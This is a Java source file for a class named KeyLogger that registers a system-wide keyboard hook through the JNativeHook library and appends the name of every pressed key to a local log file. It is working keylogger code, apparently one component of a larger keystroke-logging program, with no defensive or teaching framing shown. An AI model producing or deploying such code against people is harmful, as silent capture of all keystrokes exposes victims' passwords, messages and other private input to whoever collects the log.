import java.io.FileWriter;
import java.util.concurrent.locks.ReentrantLock;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
public class KeyLogger implements NativeKeyListener, Runnable {
	static FileWriter fw ;
	ReentrantLock re;
	KeyLogger(ReentrantLock re){
		this.re = re;
	} 
    public void run(){
		initializeFileObjects();
		try {
			GlobalScreen.registerNativeHook();
		}catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());
			System.exit(1);
		}
		GlobalScreen.addNativeKeyListener(new KeyLogger(re));
	}
    public static void initializeFileObjects(){
        try{
             fw = new FileWriter("..//logs//logs.txt",true);
        }catch(Exception e){
            System.out.println(e);
        }
    }
	public void nativeKeyPressed(NativeKeyEvent e) {
         try{
			String str = e.getKeyText(e.getKeyCode());
			re.lock();
            fw.write(str);
			fw.flush();
			re.unlock();
        }catch(Exception ex){
            System.out.println(ex);
        }
	}
	public void nativeKeyReleased(NativeKeyEvent e) {
	}
	public void nativeKeyTyped(NativeKeyEvent e) {   
	}
}